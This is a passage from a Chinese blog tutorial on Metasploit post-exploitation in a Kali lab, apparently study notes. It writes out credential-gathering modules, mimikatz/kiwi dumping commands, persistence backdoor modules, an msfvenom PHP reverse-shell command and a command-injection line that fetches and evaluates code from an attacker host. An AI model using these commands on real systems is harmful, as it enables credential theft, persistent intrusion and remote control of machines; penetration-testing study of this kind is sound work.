+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222234518924.png" alt="image-20230222234518924"></p>
+<h3 id="查看操作系统信息"><a href="#查看操作系统信息" class="headerlink" title="查看操作系统信息"></a>查看操作系统信息</h3><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;multi&#x2F;gather&#x2F;env<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222234724616.png" alt="image-20230222234724616"></p>
+<h3 id="查看firefox登录信息"><a href="#查看firefox登录信息" class="headerlink" title="查看firefox登录信息"></a>查看firefox登录信息</h3><blockquote>
+<p>若目标主机存在firefox浏览器，可以查看到其中存储的账号信息</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">run post&#x2F;multi&#x2F;gather&#x2F;firefox_creds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222234943058.png" alt="image-20230222234943058"></p>
+<h3 id="查看ssh登录信息"><a href="#查看ssh登录信息" class="headerlink" title="查看ssh登录信息"></a>查看ssh登录信息</h3><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;multi&#x2F;gather&#x2F;ssh_creds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="检查恶意软件"><a href="#检查恶意软件" class="headerlink" title="检查恶意软件"></a>检查恶意软件</h3><blockquote>
+<p>检查目标系统指定软件是否是恶意软件</p>
+<p>msf会将此程序发上传到VirusTotal网站进行在线检查，利用最新的病毒库对上传的软件进行检查</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">run post&#x2F;multi&#x2F;gather&#x2F;check_malware REMOTEFILE&#x3D;c:\\windows\\system32\\cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="自动执行meterpreter脚本"><a href="#自动执行meterpreter脚本" class="headerlink" title="自动执行meterpreter脚本"></a>自动执行meterpreter脚本</h3><h4 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223000308748.png" alt="image-20230223000308748"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223000741190.png" alt="image-20230223000741190"></p>
+<h4 id="修改host文件"><a href="#修改host文件" class="headerlink" title="修改host文件"></a>修改host文件</h4><pre class="line-numbers language-none"><code class="language-none">run hostsedit -e 1.1.1.1,www.baidu.com
+-e：将www.baidu.com解析为1.1.1.1
+编辑目标主机的host文件，可实现DNS欺骗，流量劫持等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223003634852.png" alt="image-20230223003634852"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223003902354.png" alt="image-20230223003902354"></p>
+<h3 id="自动执行post模块"><a href="#自动执行post模块" class="headerlink" title="自动执行post模块"></a>自动执行post模块</h3><blockquote>
+<p>运行此模块之前需要迁移到目标用户所在的进程中</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223002227625.png" alt="image-20230223002227625"></p>
+<h4 id="迁移进程-1"><a href="#迁移进程-1" class="headerlink" title="迁移进程"></a>迁移进程</h4><pre class="line-numbers language-none"><code class="language-none">set InitialAutoRunScript migrate -n explorer.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223002516156.png" alt="image-20230223002516156"></p>
+<h4 id="启动侦听"><a href="#启动侦听" class="headerlink" title="启动侦听"></a>启动侦听</h4><pre class="line-numbers language-none"><code class="language-none">set AutoRunScript post&#x2F;windows&#x2F;gather&#x2F;dumplinks
+查看用户的快捷方式信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223002719136.png" alt="image-20230223002719136"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223002734545.png" alt="image-20230223002734545"></p>
+<h2 id="持久后门"><a href="#持久后门" class="headerlink" title="持久后门"></a>持久后门</h2><blockquote>
+<ul>
+<li>利用漏洞取得的meterpreter shell 运行于内存中，重启失效</li>
+<li>重复 exploit 漏洞可能造成服务崩溃</li>
+<li>持久后门保证漏洞修复后仍可远程控制</li>
+</ul>
+</blockquote>
+<h3 id="Meterpreter-后门-一"><a href="#Meterpreter-后门-一" class="headerlink" title="Meterpreter 后门(一)"></a>Meterpreter 后门(一)</h3><blockquote>
+<p>metsvc</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;persistence</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223100253119.png" alt="image-20230223100253119"></p>
+<h4 id="启动侦听-1"><a href="#启动侦听-1" class="headerlink" title="启动侦听"></a>启动侦听</h4><blockquote>
+<p>不是反弹shell，而是在本地侦听一个端口31337，将自己伪装成一个系统服务metsvc</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223100443219.png" alt="image-20230223100443219"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223100716183.png" alt="image-20230223100716183"></p>
+<h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><blockquote>
+<p>不能使用nc连接，使用专门的payload模块</p>
+<p><strong>31337默认绑定侦听，不支持身份认证，任何人发现之后都可以连接</strong></p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223101740075.png" alt="image-20230223101740075"></p>
+<blockquote>
+<p>此模块应该有问题，一直在绑定连接还连接不上，而且此脚本已经被废弃，建议使用exploit&#x2F;windows&#x2F;local&#x2F;persistence</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223102307313.png" alt="image-20230223102307313"></p>
+<h3 id="Meterpreter-后门-二"><a href="#Meterpreter-后门-二" class="headerlink" title="Meterpreter 后门(二)"></a>Meterpreter 后门(二)</h3><pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;windows&#x2F;local&#x2F;persistence
+该模块会安装一个vbs，基于autorun进行维持权限
+
+exploit&#x2F;windows&#x2F;local&#x2F;persistence_service
+此模块只需要填入session和lport即可
+
+exploit&#x2F;windows&#x2F;local&#x2F;registry_persistence
+此模块同样也是自动将payload加载到注册表中
+
+设置好后门后重启生效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="配置服务端"><a href="#配置服务端" class="headerlink" title="配置服务端"></a>配置服务端</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223102550660.png" alt="image-20230223102550660"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223103323944.png" alt="image-20230223103323944"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223104405064.png" alt="image-20230223104405064"></p>
+<h4 id="侦听"><a href="#侦听" class="headerlink" title="侦听"></a>侦听</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223105452666.png" alt="image-20230223105452666"></p>
+<blockquote>
+<p>重启之后msf就会连接到客户端</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223105544430.png" alt="image-20230223105544430"></p>
+<h2 id="Msf之kiwi"><a href="#Msf之kiwi" class="headerlink" title="Msf之kiwi"></a>Msf之kiwi</h2><blockquote>
+<p>hashdump 使用的就是Mimikatz的部分功能</p>
+<p>新版本msf中的mimikatz已经被替换为kiwi</p>
+<p><strong>MSF中自带mimikatz模块，MSF中的 mimikatz 模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。</strong></p>
+<p><strong>在64位系统下必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载mimikatz并且查看系统明文。</strong></p>
+<p><strong>在32位系统下则没有这个限制。</strong></p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223110537049.png" alt="image-20230223110537049"></p>
+<pre class="line-numbers language-none"><code class="language-none">creds_all：             #列举所有凭据
+creds_kerberos：        #列举所有kerberos凭据
+creds_msv：             #列举所有msv凭据
+creds_ssp：             #列举所有ssp凭据
+creds_tspkg：           #列举所有tspkg凭据
+creds_wdigest：         #列举所有wdigest凭据
+dcsync：                #通过DCSync检索用户帐户信息
+dcsync_ntlm：           #通过DCSync检索用户帐户NTLM散列、SID和RID
+golden_ticket_create：  #创建黄金票据
+kerberos_ticket_list：  #列举kerberos票据
+kerberos_ticket_purge： #清除kerberos票据
+kerberos_ticket_use：   #使用kerberos票据
+kiwi_cmd：              #执行mimikatz的命令，后面接mimikatz.exe的命令
+lsa_dump_sam：          #dump出lsa的SAM
+lsa_dump_secrets：      #dump出lsa的密文
+password_change：       #修改密码
+wifi_list：             #列出当前用户的wifi配置文件
+wifi_list_shared：      #列出共享wifi配置文件&#x2F;编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223110621305.png" alt="image-20230223110621305"></p>
+<h3 id="迁移进程-2"><a href="#迁移进程-2" class="headerlink" title="迁移进程"></a>迁移进程</h3><blockquote>
+<p><strong>在64位系统下必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载mimikatz并且查看系统明文</strong></p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223112020242.png" alt="image-20230223112020242"></p>
+<h3 id="creds-all"><a href="#creds-all" class="headerlink" title="creds_all"></a>creds_all</h3><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/00.png" alt="00"></p>
+<h3 id="kiwi-cmd"><a href="#kiwi-cmd" class="headerlink" title="kiwi_cmd"></a>kiwi_cmd</h3><pre class="line-numbers language-none"><code class="language-none">kiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/01.png" alt="01"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/02.png" alt="02"></p>
+<h2 id="PHP-Shell"><a href="#PHP-Shell" class="headerlink" title="PHP Shell"></a>PHP Shell</h2><blockquote>
+<p>生成php shell，通过文件上传功能上传到目标站点服务器</p>
+</blockquote>
+<h3 id="生成php-shell"><a href="#生成php-shell" class="headerlink" title="生成php shell"></a>生成php shell</h3><pre class="line-numbers language-none"><code class="language-none">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.216.171 LPORT&#x3D;3333 -f raw -o a.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223121230469.png" alt="image-20230223121230469"></p>
+<h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223121437132.png" alt="image-20230223121437132"></p>
+<h3 id="开启侦听"><a href="#开启侦听" class="headerlink" title="开启侦听"></a>开启侦听</h3><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223121645723.png" alt="image-20230223121645723"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223121712167.png" alt="image-20230223121712167"></p>
+<h2 id="Web-Delivery"><a href="#Web-Delivery" class="headerlink" title="Web Delivery"></a>Web Delivery</h2><blockquote>
+<p>利用代码执行漏洞访问攻击者服务器</p>
+<p>在攻击端启动一个web server，放一个漏洞执行的代码(exploit)，找一个存在系统命令运行漏洞的目标服务器，让目标服务器访问攻击端web的exploit代码，只要访问web页面exploit代码就会自动下载到目标服务器执行，就会生成meterpreter shell回弹给攻击端。</p>
+</blockquote>
+<h3 id="启动模块"><a href="#启动模块" class="headerlink" title="启动模块"></a>启动模块</h3><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223122834364.png" alt="image-20230223122834364"></p>
+<blockquote>
+<p>本地侦听8080端口，等待目标主机远程访问8080端口的服务，此时就会将meterpreter shell传给目标主机，目标主机拿到meterpreter shell后会在本地执行拿到的meterpreter shell，最后将目标主机本地的shell反弹给攻击端。</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223122908712.png" alt="image-20230223122908712"></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre class="line-numbers language-none"><code class="language-none">127.0.0.1;php -d allow_url_fopen&#x3D;true -r &quot;eval(file_get_contents(&#39;http:&#x2F;&#x2F;192.168.216.171:8080&#x2F;LrMLRcV&#39;));&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223131500194.png" alt="image-20230223131500194"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223131536310.png" alt="image-20230223131536310"></p>
+<blockquote>
+<p>由msf生成的php命令执行无法拿到shell，利用官网提供的cmd命令可以拿到shell</p>
+<p>官网地址：<a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/web-delivery/">https://www.offensive-security.com/metasploit-unleashed/web-delivery/</a></p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223131932364.png" alt="image-20230223131932364"></p>
+<h2 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI 远程文件包含"></a>RFI 远程文件包含</h2><h3 id="msf服务端配置"><a href="#msf服务端配置" class="headerlink" title="msf服务端配置"></a>msf服务端配置</h3><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;unix&#x2F;webapp&#x2F;php_include<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223175324569.png" alt="image-20230223175324569"></p>
+<h3 id="执行exploit"><a href="#执行exploit" class="headerlink" title="执行exploit"></a>执行exploit</h3><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230223180301567.png" alt="image-20230223180301567"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">无心</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://NoobXW.github.io/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/">http://NoobXW.github.io/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">无心</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Kali/">
+                                    <span class="chip bg-color">Kali</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">内网渗透</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Kali渗透测试-MSF【后渗透】">
+                        
+                        <span class="card-title">Kali渗透测试-MSF【后渗透】</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>23-02-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Kali/" class="post-category">
+                                    Kali
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Kali/">
+                        <span class="chip bg-color">Kali</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Kali渗透测试-MSF【客户端渗透】">
+                        
+                        <span class="card-title">Kali渗透测试-MSF【客户端渗透】</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>23-02-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Kali/" class="post-category">
+                                    Kali
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Kali/">
+                        <span class="chip bg-color">Kali</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 无心<br />'
+            + '文章作者: 无心<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
